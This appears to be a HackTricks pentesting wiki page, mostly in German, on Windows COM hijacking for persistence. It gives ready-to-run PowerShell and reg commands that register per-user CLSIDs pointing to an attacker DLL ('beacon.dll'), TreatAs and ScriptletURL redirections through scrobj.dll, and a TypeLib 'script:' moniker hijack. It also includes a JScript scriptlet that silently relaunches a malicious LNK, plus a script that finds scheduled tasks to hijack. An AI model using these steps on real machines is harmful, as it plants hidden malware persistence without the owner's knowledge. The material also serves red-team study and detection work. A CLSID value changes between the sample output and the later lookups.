# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

Da die Werte von HKCU von Benutzern geändert werden können, kann **COM Hijacking** als **Persistenzmechanismus** verwendet werden. Mit `procmon` ist es einfach, nach COM-Registrierungen zu suchen, die noch nicht existieren und von einem Angreifer erstellt werden könnten. Klassische Filter:

- **RegOpenKey** operations.
- wobei das _Result_ **NAME NOT FOUND** ist.
- und der _Path_ mit **InprocServer32** endet.

Nützliche Varianten bei der Suche:

- Achte außerdem auf fehlende **`LocalServer32`**-Schlüssel. Einige COM-Klassen sind out-of-process-Server und starten eine vom Angreifer kontrollierte EXE anstelle einer DLL.
- Suche neben `InprocServer32` auch nach Registry-Einträgen **`TreatAs`** und **`ScriptletURL`**. Aktuelle Detection-Content und Malware-Writeups heben diese hervor, weil sie viel seltener sind als normale COM-Registrierungen und daher eine hohe Aussagekraft besitzen.
- Kopiere das legitime **`ThreadingModel`** aus dem Original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`, wenn du eine Registrierung nach HKCU klonst. Die Verwendung des falschen Models bricht oft die Aktivierung und macht das Hijack auffällig.
- Auf 64-bit-Systemen prüfe sowohl die 64-bit- als auch die 32-bit-Ansichten (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` und `HKLM\Software\Classes\WOW6432Node`), da 32-bit-Anwendungen möglicherweise eine andere COM-Registrierung auflösen.

Sobald du entschieden hast, welchen nicht vorhandenen COM-Eintrag du imitieren möchtest, führe die folgenden Befehle aus. _Sei vorsichtig, wenn du dich für das Imitieren eines COM entscheidest, das alle paar Sekunden geladen wird, da das übertrieben sein kann._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM-Komponenten

Windows Tasks verwenden Custom Triggers, um COM-Objekte aufzurufen, und da sie über den Task Scheduler ausgeführt werden, ist es einfacher vorherzusagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Wenn du die Ausgabe überprüfst, kannst du z. B. eine auswählen, die **bei jeder Benutzeranmeldung** ausgeführt wird.

Wenn du nun nach dem CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** sowie in HKLM und HKCU suchst, wirst du in der Regel feststellen, dass der Wert in HKCU nicht existiert.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann kannst du einfach den HKCU-Eintrag erstellen und jedes Mal, wenn sich der Benutzer anmeldet, wird deine backdoor ausgeführt.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` erlaubt es, dass ein CLSID durch einen anderen emuliert wird. Aus offensiver Perspektive bedeutet das, dass du das ursprüngliche CLSID unberührt lassen kannst, einen zweiten pro-Benutzer-CLSID erstellen kannst, der auf `scrobj.dll` zeigt, und dann das echte COM-Objekt mit `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` auf das bösartige Objekt umleiten kannst.

This is useful when:

- die Zielanwendung bereits beim Anmelden oder beim Start der Anwendung ein stabiles CLSID instanziiert
- du eine reine Registry-Umleitung statt des Ersetzens des ursprünglichen `InprocServer32` möchtest
- du ein lokales oder remote `.sct` scriptlet über den `ScriptletURL`-Wert ausführen möchtest

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Hinweise:

- `scrobj.dll` liest den `ScriptletURL`-Wert und führt die referenzierte `.sct` aus, sodass du die Payload als lokale Datei belassen oder sie remote über HTTP/HTTPS abrufen kannst.
- `TreatAs` ist besonders praktisch, wenn die ursprüngliche COM-Registrierung vollständig und stabil in HKLM ist, da du dann nur eine kleine pro-Benutzer-Umleitung brauchst, anstatt den gesamten Baum zu spiegeln.
- Zur Validierung ohne Warten auf den natürlichen Trigger kannst du das gefälschte ProgID/CLSID manuell mit `rundll32.exe -sta <ProgID-or-CLSID>` instanziieren, falls die Zielklasse STA-Aktivierung unterstützt.

## COM TypeLib Hijacking (script: moniker persistence)

Typbibliotheken (TypeLib) definieren COM-Interfaces und werden via `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, kann das OS außerdem die zugehörige TypeLib laden, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wird der TypeLib-Pfad durch einen **moniker** ersetzt, z. B. `script:C:\...\evil.sct`, führt Windows das Scriptlet aus, wenn die TypeLib aufgelöst wird – das ergibt eine unauffällige Persistenz, die ausgelöst wird, wenn gängige Komponenten angesprochen werden.

Dies wurde beim Microsoft Web Browser control beobachtet (häufig geladen von Internet Explorer, Apps, die WebBrowser einbetten, und sogar `explorer.exe`).

### Schritte (PowerShell)

1) Identifiziere die TypeLib (LIBID), die von einem CLSID mit hoher Häufigkeit verwendet wird. Beispiel-CLSID, das häufig von Malware-Ketten missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Weise den benutzerspezifischen TypeLib-Pfad auf ein lokales scriptlet mit dem `script:`-Moniker (keine Administratorrechte erforderlich):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop eine minimale JScript `.sct`, die dein primary payload neu startet (z. B. eine `.lnk`, die von der initial chain verwendet wird):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Auslösen – Das Öffnen von IE, einer Anwendung, die das WebBrowser control einbettet, oder sogar routinemäßige Explorer-Aktivität lädt die TypeLib und führt das scriptlet aus, wodurch Ihre Kette bei Anmeldung/Neustart erneut aktiviert wird.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Hinweise
- Sie können dieselbe Logik auf andere häufig verwendete COM-Komponenten anwenden; ermitteln Sie zuerst immer die echte `LIBID` aus `HKCR\CLSID\{CLSID}\TypeLib`.
- Auf 64-Bit-Systemen können Sie auch den `win64`-Unterschlüssel für 64-Bit-Anwendungen befüllen.

## Quellen

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
